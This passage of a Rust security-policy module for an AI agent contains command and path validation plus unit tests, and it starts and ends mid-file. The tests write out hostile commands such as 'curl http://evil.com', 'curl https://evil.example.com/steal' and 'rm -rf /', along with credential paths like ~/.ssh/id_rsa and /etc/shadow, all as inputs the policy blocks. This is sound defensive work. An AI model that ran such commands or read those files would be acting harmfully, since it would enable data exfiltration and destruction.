    /// Check for dangerous arguments that allow sub-command execution.
    fn is_args_safe(&self, base: &str, args: &[String]) -> bool {
        let base = base.to_ascii_lowercase();
        match base.as_str() {
            "find" => {
                // find -exec and find -ok allow arbitrary command execution
                !args.iter().any(|arg| arg == "-exec" || arg == "-ok")
            }
            "git" => {
                // Global git config injection can be used to set dangerous options
                // (e.g., pager/editor/credential helpers) even without `git config`.
                if args.iter().any(|arg| {
                    arg == "-c"
                        || arg == "--config"
                        || arg.starts_with("--config=")
                        || arg == "--config-env"
                        || arg.starts_with("--config-env=")
                }) {
                    return false;
                }

                // Determine subcommand by first non-option token.
                let Some(subcommand_index) = args.iter().position(|arg| !arg.starts_with('-'))
                else {
                    return true;
                };
                let subcommand = args[subcommand_index].as_str();

                // `git alias` can create executable aliases.
                if subcommand == "alias" || subcommand.starts_with("alias.") {
                    return false;
                }

                // Only `git config` needs special handling. Other git subcommands are
                // allowed after the global option checks above.
                if subcommand != "config" {
                    return true;
                }

                let config_args = &args[subcommand_index + 1..];

                // Allow ONLY read-only operations.
                let has_readonly_flag = config_args.iter().any(|arg| {
                    matches!(
                        arg.as_str(),
                        "--get" | "--list" | "-l" | "--get-all" | "--get-regexp" | "--get-urlmatch"
                    )
                });
                if !has_readonly_flag {
                    return false;
                }

                // Explicit write/edit operations must never be mixed with reads.
                let has_write_flag = config_args.iter().any(|arg| {
                    matches!(
                        arg.as_str(),
                        "--add"
                            | "--replace-all"
                            | "--unset"
                            | "--unset-all"
                            | "--edit"
                            | "-e"
                            | "--rename-section"
                            | "--remove-section"
                    )
                });
                if has_write_flag {
                    return false;
                }

                // Reject unknown config flags to avoid option-based bypasses.
                let has_unknown_flag = config_args.iter().any(|arg| {
                    if !arg.starts_with('-') {
                        return false;
                    }

                    let is_known_flag = matches!(
                        arg.as_str(),
                        "--get"
                            | "--list"
                            | "-l"
                            | "--get-all"
                            | "--get-regexp"
                            | "--get-urlmatch"
                            | "--global"
                            | "--system"
                            | "--local"
                            | "--worktree"
                            | "--show-origin"
                            | "--show-scope"
                            | "--null"
                            | "-z"
                            | "--name-only"
                            | "--includes"
                            | "--no-includes"
                    ) || arg == "--file"
                        || arg == "-f"
                        || arg.starts_with("--file=")
                        || arg == "--blob"
                        || arg.starts_with("--blob=")
                        || arg == "--default"
                        || arg.starts_with("--default=")
                        || arg == "--type"
                        || arg.starts_with("--type=");

                    !is_known_flag
                });
                if has_unknown_flag {
                    return false;
                }

                true
            }
            _ => true,
        }
    }

    /// Return the first path-like argument blocked by path policy.
    ///
    /// This is best-effort token parsing for shell commands and is intended
    /// as a safety gate before command execution.
    pub fn forbidden_path_argument(&self, command: &str) -> Option<String> {
        // Strip heredoc bodies so inline script content paths are not checked.
        let command = strip_heredoc_bodies(command);
        let forbidden_candidate = |raw: &str| {
            let candidate = strip_wrapping_quotes(raw).trim();
            if candidate.is_empty() || candidate.contains("://") {
                return None;
            }
            if looks_like_path(candidate) && !self.is_path_allowed(candidate) {
                Some(candidate.to_string())
            } else {
                None
            }
        };

        for segment in split_unquoted_segments(&command) {
            let cmd_part = skip_env_assignments(&segment);
            let tokens = split_shell_tokens(cmd_part);
            let Some(executable) = tokens.first() else {
                continue;
            };

            // Cover inline forms like `cat</etc/passwd`.
            if let Some(target) = redirection_target(strip_wrapping_quotes(executable)) {
                if let Some(blocked) = forbidden_candidate(target) {
                    return Some(blocked);
                }
            }

            for token in tokens.iter().skip(1) {
                let candidate = strip_wrapping_quotes(token).trim();
                if candidate.is_empty() || candidate.contains("://") {
                    continue;
                }

                if let Some(target) = redirection_target(candidate) {
                    if let Some(blocked) = forbidden_candidate(target) {
                        return Some(blocked);
                    }
                }

                // Handle option assignment forms like `--file=/etc/passwd`.
                if candidate.starts_with('-') {
                    if let Some((_, value)) = candidate.split_once('=') {
                        if let Some(blocked) = forbidden_candidate(value) {
                            return Some(blocked);
                        }
                    }
                    if let Some(value) = attached_short_option_value(candidate) {
                        if let Some(blocked) = forbidden_candidate(value) {
                            return Some(blocked);
                        }
                    }
                    continue;
                }

                if let Some(blocked) = forbidden_candidate(candidate) {
                    return Some(blocked);
                }
            }
        }

        None
    }

    // ── Path Validation ────────────────────────────────────────────────
    // Layered checks: null-byte injection → component-level traversal →
    // URL-encoded traversal → tilde expansion → absolute-path block →
    // forbidden-prefix match. Each layer addresses a distinct escape
    // technique; together they enforce workspace confinement.

    /// Check if a file path is allowed (no path traversal, within workspace)
    pub fn is_path_allowed(&self, path: &str) -> bool {
        // Block null bytes (can truncate paths in C-backed syscalls)
        if path.contains('\0') {
            return false;
        }

        // Block path traversal: check for ".." as a path component
        if Path::new(path)
            .components()
            .any(|c| matches!(c, std::path::Component::ParentDir))
        {
            return false;
        }

        // Block URL-encoded traversal attempts (e.g. ..%2f)
        let lower = path.to_lowercase();
        if lower.contains("..%2f") || lower.contains("%2f..") {
            return false;
        }

        // Reject "~user" forms because the shell expands them at runtime and
        // they can escape workspace policy.
        if path.starts_with('~') && path != "~" && !path.starts_with("~/") {
            return false;
        }

        // Expand "~" for consistent matching with forbidden paths and allowlists.
        let expanded_path = expand_user_path(path);

        // Check allowed_roots early so explicit allowlists can coexist with
        // workspace_only and broad forbidden roots like `/var` or `/dev`.
        for root in &self.allowed_roots {
            let root_expanded = expand_user_path(&root.to_string_lossy());
            if expanded_path.starts_with(&root_expanded) {
                return true;
            }
        }

        // Block absolute paths when workspace_only is set
        if self.workspace_only && expanded_path.is_absolute() {
            return false;
        }

        // Block forbidden paths using path-component-aware matching
        for forbidden in &self.forbidden_paths {
            let forbidden_path = expand_user_path(forbidden);
            if expanded_path.starts_with(forbidden_path) {
                return false;
            }
        }

        true
    }

    /// Validate that a resolved path is inside the workspace or an allowed root.
    /// Call this AFTER joining `workspace_dir` + relative path and canonicalizing.
    pub fn is_resolved_path_allowed(&self, resolved: &Path) -> bool {
        // Prefer canonical workspace root so `/a/../b` style config paths don't
        // cause false positives or negatives.
        let workspace_root = self
            .workspace_dir
            .canonicalize()
            .unwrap_or_else(|_| self.workspace_dir.clone());
        if resolved.starts_with(&workspace_root) {
            return true;
        }

        // Check extra allowed roots (e.g. shared skills directories) before
        // forbidden checks so explicit allowlists can coexist with broad
        // default forbidden roots such as `/home` and `/tmp`.
        for root in &self.allowed_roots {
            let canonical = root.canonicalize().unwrap_or_else(|_| root.clone());
            if resolved.starts_with(&canonical) {
                return true;
            }
        }

        // For paths outside workspace/allowlist, block forbidden roots to
        // prevent symlink escapes and sensitive directory access.
        for forbidden in &self.forbidden_paths {
            let forbidden_path = expand_user_path(forbidden);
            if resolved.starts_with(&forbidden_path) {
                return false;
            }
        }

        // When workspace_only is disabled the user explicitly opted out of
        // workspace confinement after forbidden-path checks are applied.
        if !self.workspace_only {
            return true;
        }

        false
    }

    fn runtime_config_dir(&self) -> Option<PathBuf> {
        let parent = self.workspace_dir.parent()?;
        Some(
            parent
                .canonicalize()
                .unwrap_or_else(|_| parent.to_path_buf()),
        )
    }

    pub fn is_runtime_config_path(&self, resolved: &Path) -> bool {
        let Some(config_dir) = self.runtime_config_dir() else {
            return false;
        };
        if !resolved.starts_with(&config_dir) {
            return false;
        }
        if resolved.parent() != Some(config_dir.as_path()) {
            return false;
        }

        let Some(file_name) = resolved.file_name().and_then(|value| value.to_str()) else {
            return false;
        };

        file_name == "config.toml"
            || file_name == "config.toml.bak"
            || file_name == "active_workspace.toml"
            || file_name.starts_with(".config.toml.tmp-")
            || file_name.starts_with(".active_workspace.toml.tmp-")
    }

    pub fn runtime_config_violation_message(&self, resolved: &Path) -> String {
        format!(
            "Refusing to modify runtime config/state file: {}. Use dedicated config tools or edit it manually outside the agent loop.",
            resolved.display()
        )
    }

    pub fn resolved_path_violation_message(&self, resolved: &Path) -> String {
        let guidance = if self.allowed_roots.is_empty() {
            "Add the directory to [autonomy].allowed_roots (for example: allowed_roots = [\"/absolute/path\"]), or move the file into the workspace."
        } else {
            "Add a matching parent directory to [autonomy].allowed_roots, or move the file into the workspace."
        };

        format!(
            "Resolved path escapes workspace allowlist: {}. {}",
            resolved.display(),
            guidance
        )
    }

    /// Check if autonomy level permits any action at all
    pub fn can_act(&self) -> bool {
        self.autonomy != AutonomyLevel::ReadOnly
    }

    // ── Tool Operation Gating ──────────────────────────────────────────────
    // Read operations bypass autonomy and rate checks because they have
    // no side effects. Act operations must pass both the autonomy gate
    // (not read-only) and the sliding-window rate limiter.

    /// Enforce policy for a tool operation.
    ///
    /// Read operations are always allowed by autonomy/rate gates.
    /// Act operations require non-readonly autonomy and available action budget.
    pub fn enforce_tool_operation(
        &self,
        operation: ToolOperation,
        operation_name: &str,
    ) -> Result<(), String> {
        match operation {
            ToolOperation::Read => Ok(()),
            ToolOperation::Act => {
                if !self.can_act() {
                    return Err(format!(
                        "Security policy: read-only mode, cannot perform '{operation_name}'"
                    ));
                }

                if !self.record_action() {
                    return Err("Rate limit exceeded: action budget exhausted".to_string());
                }

                Ok(())
            }
        }
    }

    /// Record an action and check if the rate limit has been exceeded.
    /// Returns `true` if the action is allowed, `false` if rate-limited.
    pub fn record_action(&self) -> bool {
        let count = self.tracker.record();
        count <= self.max_actions_per_hour as usize
    }

    /// Check if the rate limit would be exceeded without recording.
    pub fn is_rate_limited(&self) -> bool {
        self.tracker.count() >= self.max_actions_per_hour as usize
    }

    /// Resolve a user-provided path for tool use.
    ///
    /// Expands `~` prefixes and resolves relative paths against the workspace
    /// directory. This should be called **after** `is_path_allowed` to obtain
    /// the filesystem path that the tool actually operates on.
    pub fn resolve_tool_path(&self, path: &str) -> PathBuf {
        let expanded = expand_user_path(path);
        if expanded.is_absolute() {
            expanded
        } else if let Some(workspace_hint) = rootless_path(&self.workspace_dir) {
            if let Ok(stripped) = expanded.strip_prefix(&workspace_hint) {
                if stripped.as_os_str().is_empty() {
                    self.workspace_dir.clone()
                } else {
                    self.workspace_dir.join(stripped)
                }
            } else {
                self.workspace_dir.join(expanded)
            }
        } else {
            self.workspace_dir.join(expanded)
        }
    }

    /// Build from config sections
    /// Produce a concise security-constraint summary suitable for periodic
    /// re-injection into the conversation (safety heartbeat).
    ///
    /// The output is intentionally short (~100-150 tokens) so the token
    /// overhead per heartbeat is negligible.
    pub fn summary_for_heartbeat(&self) -> String {
        let workspace = self.workspace_dir.display();
        let ws_only = self.workspace_only;

        format!(
            "- Workspace: {workspace} (workspace_only: {ws_only})\n\
             - {}\n\
             Respond with \"Heartbeat acknowledged\" to continue.",
            self.custom_security_prompt
        )
    }

    pub fn from_config(
        autonomy_config: &crate::config::AutonomyConfig,
        workspace_dir: &Path,
    ) -> Self {
        let security_md_path = workspace_dir.join("SECURITY.md");
        let custom_security_prompt = match std::fs::read_to_string(&security_md_path) {
            Ok(content) => content,
            Err(e) => {
                if cfg!(test) {
                    String::new()
                } else {
                    panic!("SECURITY.md is required in workspace ({}): {}", security_md_path.display(), e)
                }
            }
        };

        Self {
            autonomy: autonomy_config.level,
            workspace_dir: workspace_dir.to_path_buf(),
            workspace_only: autonomy_config.workspace_only,
            allowed_commands: autonomy_config.allowed_commands.clone(),
            command_context_rules: autonomy_config
                .command_context_rules
                .iter()
                .map(|rule| CommandContextRule {
                    command: rule.command.clone(),
                    action: match rule.action {
                        crate::config::CommandContextRuleAction::Allow => {
                            CommandContextRuleAction::Allow
                        }
                        crate::config::CommandContextRuleAction::Deny => {
                            CommandContextRuleAction::Deny
                        }
                        crate::config::CommandContextRuleAction::RequireApproval => {
                            CommandContextRuleAction::RequireApproval
                        }
                    },
                    allowed_domains: rule.allowed_domains.clone(),
                    allowed_path_prefixes: rule.allowed_path_prefixes.clone(),
                    denied_path_prefixes: rule.denied_path_prefixes.clone(),
                    allow_high_risk: rule.allow_high_risk,
                })
                .collect(),
            forbidden_paths: autonomy_config.forbidden_paths.clone(),
            allowed_roots: autonomy_config
                .allowed_roots
                .iter()
                .map(|root| {
                    let expanded = expand_user_path(root);
                    if expanded.is_absolute() {
                        expanded
                    } else {
                        workspace_dir.join(expanded)
                    }
                })
                .collect(),
            max_actions_per_hour: autonomy_config.max_actions_per_hour,
            max_cost_per_day_cents: autonomy_config.max_cost_per_day_cents,
            require_approval_for_medium_risk: autonomy_config.require_approval_for_medium_risk,
            block_high_risk_commands: autonomy_config.block_high_risk_commands,
            shell_env_passthrough: autonomy_config.shell_env_passthrough.clone(),
            allow_sensitive_file_reads: autonomy_config.allow_sensitive_file_reads,
            allow_sensitive_file_writes: autonomy_config.allow_sensitive_file_writes,
            tracker: ActionTracker::new(),
            custom_security_prompt,
        }
    }

    /// Giving the LLM visibility into these constraints prevents it from
    /// wasting tokens on commands / paths that will be rejected at runtime.
    pub fn prompt_summary(&self) -> String {
        use std::fmt::Write;

        let mut out = String::new();

        // Workspace constraint
        if self.workspace_only {
            let _ = writeln!(
                out,
                "**Workspace boundary**: file operations are restricted to `{}`.",
                self.workspace_dir.display()
            );
        }

        // Allowed roots
        if !self.allowed_roots.is_empty() {
            let roots: Vec<String> = self
                .allowed_roots
                .iter()
                .map(|p| format!("`{}`", p.display()))
                .collect();
            let _ = writeln!(out, "**Additional allowed paths**: {}", roots.join(", "));
        }

        // Allowed commands
        if !self.allowed_commands.is_empty() {
            let cmds: Vec<String> = self
                .allowed_commands
                .iter()
                .map(|c| format!("`{c}`"))
                .collect();
            let _ = writeln!(
                out,
                "**Allowed shell commands**: {}. \
                 Commands not on this list will be rejected.",
                cmds.join(", ")
            );
        }

        // Forbidden paths
        if !self.forbidden_paths.is_empty() {
            let paths: Vec<String> = self
                .forbidden_paths
                .iter()
                .map(|p| format!("`{p}`"))
                .collect();
            let _ = writeln!(
                out,
                "**Forbidden paths**: {}. \
                 Any read/write/exec targeting these paths will be blocked.",
                paths.join(", ")
            );
        }

        // Risk controls
        if self.block_high_risk_commands {
            let _ = writeln!(
                out,
                "**High-risk commands** (rm, kill, reboot, etc.) are blocked."
            );
        }
        if self.require_approval_for_medium_risk {
            let _ = writeln!(
                out,
                "**Medium-risk commands** require user approval before execution."
            );
        }

        let _ = writeln!(out, "**Safety reminder**: {}\n", self.custom_security_prompt);

        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn default_policy() -> SecurityPolicy {
        SecurityPolicy::default()
    }

    fn readonly_policy() -> SecurityPolicy {
        SecurityPolicy {
            autonomy: AutonomyLevel::ReadOnly,
            ..SecurityPolicy::default()
        }
    }

    fn full_policy() -> SecurityPolicy {
        SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            ..SecurityPolicy::default()
        }
    }

    // ── AutonomyLevel ────────────────────────────────────────

    #[test]
    fn autonomy_default_is_supervised() {
        assert_eq!(AutonomyLevel::default(), AutonomyLevel::Supervised);
    }

    #[test]
    fn autonomy_serde_roundtrip() {
        let json = serde_json::to_string(&AutonomyLevel::Full).unwrap();
        assert_eq!(json, "\"full\"");
        let parsed: AutonomyLevel = serde_json::from_str("\"readonly\"").unwrap();
        assert_eq!(parsed, AutonomyLevel::ReadOnly);
        let parsed2: AutonomyLevel = serde_json::from_str("\"supervised\"").unwrap();
        assert_eq!(parsed2, AutonomyLevel::Supervised);
    }

    #[test]
    fn can_act_readonly_false() {
        assert!(!readonly_policy().can_act());
    }

    #[test]
    fn can_act_supervised_true() {
        assert!(default_policy().can_act());
    }

    #[test]
    fn can_act_full_true() {
        assert!(full_policy().can_act());
    }

    #[test]
    fn enforce_tool_operation_read_allowed_in_readonly_mode() {
        let p = readonly_policy();
        assert!(
            p.enforce_tool_operation(ToolOperation::Read, "memory_recall")
                .is_ok()
        );
    }

    #[test]
    fn enforce_tool_operation_act_blocked_in_readonly_mode() {
        let p = readonly_policy();
        let err = p
            .enforce_tool_operation(ToolOperation::Act, "memory_store")
            .unwrap_err();
        assert!(err.contains("read-only mode"));
    }

    #[test]
    fn enforce_tool_operation_act_uses_rate_budget() {
        let p = SecurityPolicy {
            max_actions_per_hour: 0,
            ..default_policy()
        };
        let err = p
            .enforce_tool_operation(ToolOperation::Act, "memory_store")
            .unwrap_err();
        assert!(err.contains("Rate limit exceeded"));
    }

    // ── is_command_allowed ───────────────────────────────────

    #[test]
    fn allowed_commands_basic() {
        let p = default_policy();
        assert!(p.is_command_allowed("ls"));
        assert!(p.is_command_allowed("git status"));
        assert!(p.is_command_allowed("cargo build --release"));
        assert!(p.is_command_allowed("mkdir -p docs"));
        assert!(p.is_command_allowed("touch notes.md"));
        assert!(p.is_command_allowed("cat file.txt"));
        assert!(p.is_command_allowed("grep -r pattern ."));
        assert!(p.is_command_allowed("date"));
    }

    #[test]
    fn blocked_commands_basic() {
        let p = default_policy();
        assert!(!p.is_command_allowed("rm -rf /"));
        assert!(!p.is_command_allowed("sudo apt install"));
        assert!(!p.is_command_allowed("curl http://evil.com"));
        assert!(!p.is_command_allowed("wget http://evil.com"));
        assert!(!p.is_command_allowed("python3 exploit.py"));
        assert!(!p.is_command_allowed("node malicious.js"));
    }

    #[test]
    fn readonly_blocks_all_commands() {
        let p = readonly_policy();
        assert!(!p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("cat file.txt"));
        assert!(!p.is_command_allowed("echo hello"));
    }

    #[test]
    fn full_autonomy_still_uses_allowlist() {
        let p = full_policy();
        assert!(p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("rm -rf /"));
    }

    #[test]
    fn command_with_absolute_path_extracts_basename() {
        let p = default_policy();
        assert!(p.is_command_allowed("/usr/bin/git status"));
        assert!(p.is_command_allowed("/bin/ls -la"));
    }

    #[test]
    fn allowlist_supports_explicit_executable_paths() {
        let p = SecurityPolicy {
            allowed_commands: vec!["/usr/bin/antigravity".into()],
            ..SecurityPolicy::default()
        };

        assert!(p.is_command_allowed("/usr/bin/antigravity"));
        assert!(!p.is_command_allowed("antigravity"));
    }

    #[test]
    fn allowlist_supports_wildcard_entry() {
        let p = SecurityPolicy {
            allowed_commands: vec!["*".into()],
            ..SecurityPolicy::default()
        };

        assert!(p.is_command_allowed("python3 --version"));
        assert!(p.is_command_allowed("/usr/bin/antigravity"));

        // Wildcard still respects risk gates in validate_command_execution.
        let blocked = p.validate_command_execution("rm -rf tmp_test_dir", true);
        assert!(blocked.is_err());
        assert!(blocked.unwrap_err().contains("high-risk"));
    }

    #[test]
    fn empty_command_blocked() {
        let p = default_policy();
        assert!(!p.is_command_allowed(""));
        assert!(!p.is_command_allowed("   "));
    }

    #[test]
    fn command_with_pipes_validates_all_segments() {
        let p = default_policy();
        // Both sides of the pipe are in the allowlist
        assert!(p.is_command_allowed("ls | grep foo"));
        assert!(p.is_command_allowed("cat file.txt | wc -l"));
        // Second command not in allowlist — blocked
        assert!(!p.is_command_allowed("ls | curl http://evil.com"));
        assert!(!p.is_command_allowed("echo hello | python3 -"));
    }

    #[test]
    fn custom_allowlist() {
        let p = SecurityPolicy {
            allowed_commands: vec!["docker".into(), "kubectl".into()],
            ..SecurityPolicy::default()
        };
        assert!(p.is_command_allowed("docker ps"));
        assert!(p.is_command_allowed("kubectl get pods"));
        assert!(!p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("git status"));
    }

    #[test]
    fn empty_allowlist_blocks_everything() {
        let p = SecurityPolicy {
            allowed_commands: vec![],
            ..SecurityPolicy::default()
        };
        assert!(!p.is_command_allowed("ls"));
        assert!(!p.is_command_allowed("echo hello"));
    }

    #[test]
    fn context_allow_rule_overrides_global_allowlist_for_curl_domain() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            allowed_commands: vec![],
            command_context_rules: vec![CommandContextRule {
                command: "curl".into(),
                action: CommandContextRuleAction::Allow,
                allowed_domains: vec!["api.example.com".into()],
                allowed_path_prefixes: vec![],
                denied_path_prefixes: vec![],
                allow_high_risk: true,
            }],
            ..SecurityPolicy::default()
        };

        assert!(p.is_command_allowed("curl https://api.example.com/v1/health"));
        assert!(
            p.validate_command_execution("curl https://api.example.com/v1/health", true)
                .is_ok()
        );
    }

    #[test]
    fn context_allow_rule_restricts_curl_to_matching_domains() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            allowed_commands: vec!["curl".into()],
            command_context_rules: vec![CommandContextRule {
                command: "curl".into(),
                action: CommandContextRuleAction::Allow,
                allowed_domains: vec!["api.example.com".into()],
                allowed_path_prefixes: vec![],
                denied_path_prefixes: vec![],
                allow_high_risk: true,
            }],
            ..SecurityPolicy::default()
        };

        assert!(!p.is_command_allowed("curl https://evil.example.com/steal"));
        let err = p
            .validate_command_execution("curl https://evil.example.com/steal", true)
            .expect_err("non-matching domains should be denied by context rules");
        assert!(err.contains("context rule denied"));
    }

    #[test]
    fn context_allow_rule_restricts_rm_to_allowed_path_prefix() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            workspace_only: false,
            allowed_commands: vec!["rm".into()],
            forbidden_paths: vec![],
            command_context_rules: vec![CommandContextRule {
                command: "rm".into(),
                action: CommandContextRuleAction::Allow,
                allowed_domains: vec![],
                allowed_path_prefixes: vec!["/tmp".into()],
                denied_path_prefixes: vec![],
                allow_high_risk: true,
            }],
            ..SecurityPolicy::default()
        };

        assert!(p.is_command_allowed("rm -rf /tmp/cleanup"));
        assert!(
            p.validate_command_execution("rm -rf /tmp/cleanup", true)
                .is_ok()
        );

        assert!(!p.is_command_allowed("rm -rf /var/log"));
        let err = p
            .validate_command_execution("rm -rf /var/log", true)
            .expect_err("paths outside /tmp should be denied");
        assert!(err.contains("context rule denied"));
    }

    #[test]
    fn context_deny_rule_can_block_specific_domain_even_when_allowlisted() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            block_high_risk_commands: false,
            allowed_commands: vec!["curl".into()],
            command_context_rules: vec![CommandContextRule {
                command: "curl".into(),
                action: CommandContextRuleAction::Deny,
                allowed_domains: vec!["evil.example.com".into()],
                allowed_path_prefixes: vec![],
                denied_path_prefixes: vec![],
                allow_high_risk: false,
            }],
            ..SecurityPolicy::default()
        };

        assert!(p.is_command_allowed("curl https://api.example.com/v1/health"));
        assert!(!p.is_command_allowed("curl https://evil.example.com/steal"));
    }

    #[test]
    fn context_require_approval_rule_demands_approval_for_matching_low_risk_command() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            require_approval_for_medium_risk: false,
            allowed_commands: vec!["ls".into()],
            command_context_rules: vec![CommandContextRule {
                command: "ls".into(),
                action: CommandContextRuleAction::RequireApproval,
                allowed_domains: vec![],
                allowed_path_prefixes: vec![],
                denied_path_prefixes: vec![],
                allow_high_risk: false,
            }],
            ..SecurityPolicy::default()
        };

        let denied = p.validate_command_execution("ls -la", false);
        assert!(denied.is_err());
        assert!(denied.unwrap_err().contains("requires explicit approval"));

        let allowed = p.validate_command_execution("ls -la", true);
        assert_eq!(allowed.unwrap(), CommandRiskLevel::Low);
    }

    #[test]
    fn context_require_approval_rule_is_still_constrained_by_domains() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            block_high_risk_commands: false,
            allowed_commands: vec!["curl".into()],
            command_context_rules: vec![CommandContextRule {
                command: "curl".into(),
                action: CommandContextRuleAction::RequireApproval,
                allowed_domains: vec!["api.example.com".into()],
                allowed_path_prefixes: vec![],
                denied_path_prefixes: vec![],
                allow_high_risk: false,
            }],
            ..SecurityPolicy::default()
        };

        // Non-matching domain does not trigger the context approval rule.
        let unmatched = p.validate_command_execution("curl https://other.example.com/health", true);
        assert_eq!(unmatched.unwrap(), CommandRiskLevel::High);

        // Matching domain triggers explicit approval requirement.
        let denied = p.validate_command_execution("curl https://api.example.com/v1/health", false);
        assert!(denied.is_err());
        assert!(denied.unwrap_err().contains("requires explicit approval"));
    }

    #[test]
    fn command_risk_low_for_read_commands() {
        let p = default_policy();
        assert_eq!(p.command_risk_level("git status"), CommandRiskLevel::Low);
        assert_eq!(p.command_risk_level("ls -la"), CommandRiskLevel::Low);
    }

    #[test]
    fn command_risk_medium_for_mutating_commands() {
        let p = SecurityPolicy {
            allowed_commands: vec!["git".into(), "touch".into()],
            ..SecurityPolicy::default()
        };
        assert_eq!(
            p.command_risk_level("git reset --hard HEAD~1"),
            CommandRiskLevel::Medium
        );
        assert_eq!(
            p.command_risk_level("touch file.txt"),
            CommandRiskLevel::Medium
        );
    }

    #[test]
    fn command_risk_high_for_dangerous_commands() {
        let p = SecurityPolicy {
            allowed_commands: vec!["rm".into()],
            ..SecurityPolicy::default()
        };
        assert_eq!(
            p.command_risk_level("rm -rf /tmp/test"),
            CommandRiskLevel::High
        );
    }

    #[test]
    fn validate_command_requires_approval_for_medium_risk() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            require_approval_for_medium_risk: true,
            allowed_commands: vec!["touch".into()],
            ..SecurityPolicy::default()
        };

        let denied = p.validate_command_execution("touch test.txt", false);
        assert!(denied.is_err());
        assert!(denied.unwrap_err().contains("requires explicit approval"),);

        let allowed = p.validate_command_execution("touch test.txt", true);
        assert_eq!(allowed.unwrap(), CommandRiskLevel::Medium);
    }

    #[test]
    fn validate_command_blocks_high_risk_by_default() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            allowed_commands: vec!["rm".into()],
            ..SecurityPolicy::default()
        };

        let result = p.validate_command_execution("rm -rf tmp_test_dir", true);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("high-risk"));
    }

    #[test]
    fn validate_command_full_mode_skips_medium_risk_approval_gate() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Full,
            require_approval_for_medium_risk: true,
            allowed_commands: vec!["touch".into()],
            ..SecurityPolicy::default()
        };

        let result = p.validate_command_execution("touch test.txt", false);
        assert_eq!(result.unwrap(), CommandRiskLevel::Medium);
    }

    #[test]
    fn validate_command_rejects_background_chain_bypass() {
        let p = default_policy();
        let result = p.validate_command_execution("ls & python3 -c 'print(1)'", false);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("not allowed"));
    }

    // ── is_path_allowed ─────────────────────────────────────

    #[test]
    fn relative_paths_allowed() {
        let p = default_policy();
        assert!(p.is_path_allowed("file.txt"));
        assert!(p.is_path_allowed("src/main.rs"));
        assert!(p.is_path_allowed("deep/nested/dir/file.txt"));
    }

    #[test]
    fn path_traversal_blocked() {
        let p = default_policy();
        assert!(!p.is_path_allowed("../etc/passwd"));
        assert!(!p.is_path_allowed("../../root/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("foo/../../../etc/shadow"));
        assert!(!p.is_path_allowed(".."));
    }

    #[test]
    fn absolute_paths_blocked_when_workspace_only() {
        let p = default_policy();
        assert!(!p.is_path_allowed("/etc/passwd"));
        assert!(!p.is_path_allowed("/root/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("/tmp/file.txt"));
    }

    #[test]
    fn absolute_paths_allowed_when_not_workspace_only() {
        let p = SecurityPolicy {
            workspace_only: false,
            forbidden_paths: vec![],
            ..SecurityPolicy::default()
        };
        assert!(p.is_path_allowed("/tmp/file.txt"));
    }

    #[test]
    fn forbidden_paths_blocked() {
        let p = SecurityPolicy {
            workspace_only: false,
            ..SecurityPolicy::default()
        };
        assert!(!p.is_path_allowed("/etc/passwd"));
        assert!(!p.is_path_allowed("/root/.bashrc"));
        assert!(!p.is_path_allowed("~/.ssh/id_rsa"));
        assert!(!p.is_path_allowed("~/.gnupg/pubring.kbx"));
    }

    #[test]
    fn empty_path_allowed() {
        let p = default_policy();
        assert!(p.is_path_allowed(""));
    }

    #[test]
    fn dotfile_in_workspace_allowed() {
        let p = default_policy();
        assert!(p.is_path_allowed(".gitignore"));
        assert!(p.is_path_allowed(".env"));
    }

    // ── from_config ─────────────────────────────────────────

    #[test]
    fn from_config_maps_all_fields() {
        let autonomy_config = crate::config::AutonomyConfig {
            level: AutonomyLevel::Full,
            workspace_only: false,
            allowed_commands: vec!["docker".into()],
            forbidden_paths: vec!["/secret".into()],
            max_actions_per_hour: 100,
            max_cost_per_day_cents: 1000,
            require_approval_for_medium_risk: false,
            block_high_risk_commands: false,
            shell_env_passthrough: vec!["DATABASE_URL".into()],
            allow_sensitive_file_reads: true,
            allow_sensitive_file_writes: true,
            ..crate::config::AutonomyConfig::default()
        };
        let workspace = PathBuf::from("/tmp/test-workspace");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

        assert_eq!(policy.autonomy, AutonomyLevel::Full);
        assert!(!policy.workspace_only);
        assert_eq!(policy.allowed_commands, vec!["docker"]);
        assert_eq!(policy.forbidden_paths, vec!["/secret"]);
        assert_eq!(policy.max_actions_per_hour, 100);
        assert_eq!(policy.max_cost_per_day_cents, 1000);
        assert!(!policy.require_approval_for_medium_risk);
        assert!(!policy.block_high_risk_commands);
        assert_eq!(policy.shell_env_passthrough, vec!["DATABASE_URL"]);
        assert!(policy.allow_sensitive_file_reads);
        assert!(policy.allow_sensitive_file_writes);
        assert_eq!(policy.workspace_dir, PathBuf::from("/tmp/test-workspace"));
    }

    #[test]
    fn from_config_normalizes_allowed_roots() {
        let autonomy_config = crate::config::AutonomyConfig {
            allowed_roots: vec!["~/Desktop".into(), "shared-data".into()],
            ..crate::config::AutonomyConfig::default()
        };
        let workspace = PathBuf::from("/tmp/test-workspace");
        let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

        let expected_home_root = if let Some(home) = std::env::var_os("HOME") {
            PathBuf::from(home).join("Desktop")
        } else {
            PathBuf::from("~/Desktop")
        };

        assert_eq!(policy.allowed_roots[0], expected_home_root);
        assert_eq!(policy.allowed_roots[1], workspace.join("shared-data"));
    }

    #[test]
    fn from_config_maps_command_rule_require_approval_action() {
        let autonomy_config = crate::config::AutonomyConfig {
            command_context_rules: vec![crate::config::CommandContextRuleConfig {
                command: "rm".into(),
                action: crate::config::CommandContextRuleAction::RequireApproval,
                allowed_domains: vec![],
                allowed_path_prefixes: vec![],
